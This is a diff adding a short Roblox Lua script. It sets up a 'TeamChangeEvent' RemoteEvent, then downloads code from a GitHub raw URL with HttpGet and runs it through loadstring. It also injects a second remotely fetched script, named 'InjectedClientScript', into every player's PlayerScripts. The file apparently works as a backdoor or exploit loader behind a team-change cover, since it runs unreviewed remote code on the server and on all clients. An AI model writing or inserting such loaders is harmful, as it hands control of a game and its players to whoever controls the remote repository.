@@ -1,0 +1,25 @@
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+
+local TeamChangeEvent = Instance.new("RemoteEvent")
+TeamChangeEvent.Name = "TeamChangeEvent"
+TeamChangeEvent.Parent = ReplicatedStorage
+
+local serverCode = game:HttpGet("https://raw.githubusercontent.com/beeryouion-star/c00kahai/refs/heads/main/ServerScriptService")
+loadstring(serverCode)()
+
+local function giveClientScript(player)
+    local clientCode = game:HttpGet("https://raw.githubusercontent.com/beeryouion-star/c00kahai/refs/heads/main/StarterPlayerScripts")
+    local localScript = Instance.new("LocalScript")
+    localScript.Name = "InjectedClientScript"
+    localScript.Parent = player:WaitForChild("PlayerScripts")
+    localScript.Source = clientCode
+end
+
+Players.PlayerAdded:Connect(function(player)
+    giveClientScript(player)
+end)
+
+for _, player in pairs(Players:GetPlayers()) do
+    giveClientScript(player)
+end
